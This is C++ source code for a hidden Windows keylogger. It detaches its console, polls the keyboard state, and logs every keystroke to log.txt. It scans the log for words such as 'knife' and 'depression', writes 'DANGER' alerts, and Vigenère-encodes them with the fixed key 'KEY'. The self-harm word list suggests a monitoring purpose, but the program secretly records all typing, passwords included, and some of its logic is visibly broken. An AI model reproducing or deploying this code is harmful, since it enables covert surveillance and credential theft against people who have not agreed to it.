#include <iostream>
#include <Windows.h>
#include <Winuser.h>
#include <fstream>
#include<bits/stdc++.h>
using namespace std;

const int max_no_of_keys = 1000;
bool CapskeyUp;

vector<string> sensitive_words = {"knife", "hurt", "depression","stress","Blue Whale Game"}; // Predefined sensitive words

string vigenereEncrypt(const string& plaintext, const string& key) {
    string ciphertext = plaintext;
    int keyIndex = 0;
    for (size_t i = 0; i<plaintext.length(); i++) {
        if (isalpha(plaintext[i])) {
            char base = islower(plaintext[i]) ? 'a' : 'A';
            int shift = (tolower(key[keyIndex % key.length()]) - 'a') % 26;
            ciphertext[i] = (plaintext[i] - base + shift) % 26 + base;
            keyIndex++;
        }
    }
    return ciphertext;
}

// Function to check if any predefined string matches content in log file
void checkForSensitiveContent(const string &filename) {
   fstream file(filename, ios::in);
    if (!file.is_open()) return;

    string content;
    getline(file, content, '\0'); 
    file.close();

    for (const string &word : sensitive_words) {
        if (content.find(word) != string::npos) {
            ofstream alert("alert.txt", ofstream::out | ofstream::app);
            if (alert.is_open()) {
                alert << "*********************************\n";
                alert << "Caution we found this -> " << word << "\n";
                alert << "*********************************\n";
    alert<< "*                       *" << endl;
    alert<< "*      Danger Sign      *" << endl;
    alert<< "*                       *" << endl;
    alert<< "*       .-\"\"\"\"-.        *" << endl;
    alert<< "*      / _  _   \\      *" << endl;
    alert<< "*     (   o o    )     *" << endl;
    alert<< "*      \\   7   /       *" << endl;
    alert << "*       '-._.-'        *" << endl;
    alert<< "*                       *" << endl;
    alert<< "*    --  // \\\\  --     *" << endl;
    alert<< "*   //\\\\ //   \\\\ //\\\\  *" << endl;
    alert<< "*                       *" << endl;
    alert<< "*       DANGER!        *" << endl;
    alert<< "*************************" << endl;


                alert.close();
            }
            // Clear the contents of log.txt
            ofstream clear_log(filename, ios::out | ios::trunc); 
            clear_log.close();
            break; // Stop after the first match and clearing log.txt
        }
    }
}
int fun1(int key, const char *filename)
{
ofstream output_file(filename, ofstream::out | ofstream::app);
if(output_file.is_open())
{
if((!GetAsyncKeyState(VK_SHIFT)) && (CapskeyUp == false))
{
key+=32;
output_file << char (key);
}

else if((GetAsyncKeyState(VK_SHIFT)) && (CapskeyUp == true))
{
key+=32;
output_file << char (key);
}

else
{
output_file << char (key);
}

output_file.close();
checkForSensitiveContent(filename);
return 0;
}

else
return 1;
}

int fun2(int key, const char *filename)
{
ofstream output_file(filename, ofstream::out | ofstream::app);
if(output_file.is_open())
{
if(!GetAsyncKeyState(VK_SHIFT))
{
switch(key)
{
case 186: output_file << ";";
break;
case 187: output_file << "=";
break;
case 188: output_file << ",";
break;
case 189: output_file << "-";
break;
case 190: output_file << ".";
break;
case 191: output_file << "/";
break;
case 192: output_file << "";
break;
case 219: output_file << "[";
break;
case 220: output_file << "\\";
break;
case 221: output_file << "]";
break;
case 222: output_file << "\'";
break;
default: output_file << char (key);

switch(key)
{
case 48: output_file << ")";
break;
case 49: output_file << "!";
break;
case 50: output_file << "@";
break;
case 51: output_file << "#";
break;
case 52: output_file << "$";
break;
case 53: output_file << "%";
break;
case 54: output_file << "^";
break;
case 55: output_file << "&";
break;
case 56: output_file << "*";
break;
case 57: output_file << "(";
break;
case 186: output_file << ":";
break;
case 187: output_file << "+";
break;
case 188: output_file << "<";
break;
case 189: output_file << "_";
break;
case 190: output_file << ">";
break;
case 191: output_file << "\?";
break;
case 192: output_file << "~";
break;
case 219: output_file << "{";
break;
case 220: output_file << "|";
break;
case 221: output_file << "}";
break;
case 222: output_file << "\"";
break;
}
}

output_file.close();
checkForSensitiveContent(filename);
return 0;

}
else
return 1;
}
return 0;
}

int fun3(int key, const char *filename)
{

if (key == VK_BACK)
    {

        fstream file(filename, ios::in);
        if (!file.is_open()) return 1;

        string content;
        getline(file, content, '\0'); 
        file.close();

        // Remove the last character if the file is not empty
        if (!content.empty())
        {
            content.pop_back();
        }

        file.open(filename, ios::out | ios::trunc); // Truncate to overwrite
        if (file.is_open())
        {
            file << content;
            file.close();
        }

        return 0;
    }

ofstream output_file(filename,ofstream::out|ofstream::app);
if(output_file.is_open())
{
switch(key)
{

case VK_TAB: output_file << "[Tab]";
break;
case VK_CAPITAL:
if(CapskeyUp == true)
{
output_file << "[Caps_Key_On]";
CapskeyUp = false;
}

else
{
output_file << "[Caps_Key_Off]";
CapskeyUp = true;
}
break;

case VK_ESCAPE: output_file << "[Escape]";
break;
case VK_SPACE: output_file << "[Space] ";
break;
case VK_PRIOR: output_file << "[Page_Up]";
break;
case VK_NEXT: output_file << "[Page_Down]";
break;
case VK_END: output_file << "[End]";
break;
case VK_HOME: output_file << "[Home]";
break;
case VK_INSERT: output_file << "[Insert]";
break;
case VK_DELETE: output_file << "[Delete]";
break;
case VK_LWIN: output_file << "[Left_Windows]";
break;
case VK_RWIN: output_file << "[Right_Windows]";
break;
case VK_APPS: output_file << "[Menu]";
break;
case VK_F1: output_file << "[F1_Key]";
break;
case VK_F2: output_file << "[F2_Key]";
break;
case VK_F3: output_file << "[F3_Key]";
break;
case VK_F4: output_file << "[F4_Key]";
break;
case VK_F5: output_file << "[F5_Key]";
break;
case VK_F6: output_file << "[F6_Key]";
break;
case VK_F7: output_file << "[F7_Key]";
break;
case VK_F8: output_file << "[F8_Key]";
break;
case VK_F9: output_file << "[F9_Key]";
break;
case VK_F10: output_file << "[F10_Key]";
break;
case VK_F11: output_file << "[F11_Key]";
break;
case VK_F12: output_file << "[F12_Key]";
break;
case VK_LCONTROL: output_file << "[Left_Control_Key]";
break;
case VK_RCONTROL: output_file << "[Right_Control_Key]";
break;
case VK_LMENU: output_file << "[Left_Alternate]";
break;
case VK_RMENU: output_file << "[Right_Alternate]";
break;
}
output_file.close();
checkForSensitiveContent(filename);
return 0;
}

else
return 1;
}

int main()
{
FreeConsole();
if((GetKeyState(VK_CAPITAL)&0x0001)!= 0)
CapskeyUp=true;
else
CapskeyUp=false;
int count = 0;
while(count < max_no_of_keys)
{

for(int letter = 65; letter < 91; letter++)
{
if(GetAsyncKeyState(letter) == -32767)
{
count++;
fun1(letter, "log.txt");
}
}
for(int number = 48; number < 58; number++)
{
if(GetAsyncKeyState(number) == -32767)
{
count++;
fun2(number, "log.txt");
}
}
for(int special_character = 186; special_character < 193; special_character++)
{
if(GetAsyncKeyState(special_character) == -32767)
{
count++;
fun2(special_character, "log.txt");
}
}
for(int special_character = 219; special_character < 223; special_character++)
{
if(GetAsyncKeyState(special_character) == -32767)
{
count++;
fun2(special_character, "log.txt");
}
}
if(GetAsyncKeyState(1) == -32767)
{
count++;
fun3(1, "log.txt");
}
if(GetAsyncKeyState(2) == -32767)
{
count++;
fun3(2, "log.txt");
}
if(GetAsyncKeyState(4) == -32767)
{
count++;
fun3(4, "log.txt");
}

for(int special_character = 8; special_character < 10; special_character++)
{
if(GetAsyncKeyState(special_character) == -32767)
{
count++;
fun3(special_character, "log.txt");
}
}
if(GetAsyncKeyState(13) == -32767)
{
count++;
fun3(13, "log.txt");
}
if(GetAsyncKeyState(16) == -32767)
{
count++;
fun3(16, "log.txt");
}
if(GetAsyncKeyState(20) == -32767)
{
count++;
fun3(20, "log.txt");
}
if(GetAsyncKeyState(27) == -32767)
{
count++;
fun3(27, "log.txt");
}
for(int special_character = 32; special_character < 41; special_character++)
{
if(GetAsyncKeyState(special_character) == -32767)
{
count++;
fun3(special_character, "log.txt");
}
}
for(int special_character = 45; special_character < 47; special_character++)
{
if(GetAsyncKeyState(special_character) == -32767)
{
count++;
fun3(special_character, "log.txt");
}
}
for(int special_character = 91; special_character < 94; special_character++)
{
if(GetAsyncKeyState(special_character) == -32767)

{
count++;
fun3(special_character, "log.txt");
}
}
for(int special_character = 112; special_character < 124; special_character++)
{
if(GetAsyncKeyState(special_character) == -32767)
{
count++;
fun3(special_character, "log.txt");
}
}
for(int special_character = 162; special_character < 166; special_character++)
{
if(GetAsyncKeyState(special_character) == -32767)
{
count++;
fun3(special_character, "log.txt");
}

 ifstream inputFile("alert.txt");
    if (!inputFile.is_open()) {
        cerr << "Failed to open alert.txt for reading!" << std::endl;
        return 1;
    }

    string content((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
    inputFile.close();

    // Encrypt the content using Vigenère cipher
    string key = "KEY";  
    string encryptedContent = vigenereEncrypt(content, key);

    // Write the encrypted content to a new file
    ofstream outputFile("encrypted_alert.txt");
    if (!outputFile.is_open()) {
        cerr << "Failed to open encrypted_alert.txt for writing!" << endl;
        return 1;
    }
    outputFile << encryptedContent;
    outputFile.close();

}
}
return 0;
}
